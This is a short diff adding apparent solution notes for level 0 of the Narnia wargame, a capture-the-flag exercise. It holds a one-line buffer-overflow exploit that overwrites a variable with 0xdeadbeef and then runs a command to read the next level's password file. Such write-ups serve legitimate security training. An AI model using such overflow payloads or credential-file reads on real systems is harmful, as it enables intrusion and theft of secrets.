@@ -1,0 +1,3 @@
+0:
+  cat /narnia/narnia0.c
+  printf "12345678901234567890\xef\xbe\xad\xde %4072s whoami; cat /etc/narnia_pass/narnia1" | /narnia/narnia0
